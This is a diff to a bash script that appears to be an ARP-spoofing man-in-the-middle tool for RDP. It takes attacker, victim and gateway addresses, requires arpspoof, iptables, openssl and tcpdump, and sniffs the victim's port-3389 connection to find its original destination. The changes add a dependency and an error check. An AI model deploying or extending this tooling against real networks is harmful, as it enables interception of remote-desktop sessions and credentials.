@@ -19,12 +19,12 @@ fi
 if [ "$#" -ne 4 ]; then
     cat << EOF
 Usage:
-$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP>
+$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP|HOST_IP>
 EOF
     exit 1
 fi
 
-for com in arpspoof openssl iptables ; do
+for com in tcpdump arpspoof openssl iptables ; do
     command -v "$com" >/dev/null 2>&1 || {
         echo >&2 "$com required, but it's not installed.  Aborting."
         exit 1
@@ -104,6 +104,11 @@ ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
     "tcp[tcpflags] ==  tcp-syn" and \
     src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
     | sed -e  's/.*> \([0-9.]*\)\.3389:.*/\1/')"
+
+if [ -z "$ORIGINAL_DEST" ] ; then
+    echo "[!] Something went wrong while parsing the output of tcpdump"
+    exit 1
+fi
 
 echo "[+] Got it! Original destination is $ORIGINAL_DEST"
 
